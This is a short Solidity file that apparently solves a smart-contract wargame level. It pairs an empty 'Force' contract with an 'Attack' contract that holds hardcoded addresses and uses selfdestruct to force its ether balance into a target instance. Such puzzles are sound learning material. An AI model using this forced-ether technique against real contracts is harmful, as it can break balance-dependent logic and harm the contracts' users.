// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attack{
    event Code(bytes code);
    address player=0x3fA68299Fe2AF4ac77260B806c4ffCF4A74Bd28A;
    address instance = 0xdDAaDE33BD380947dFe8c8EEE4AF69ee2928862c;
    constructor() payable{}
    receive() external payable{}

    function solve() public {
        selfdestruct(payable(instance));
    }
}
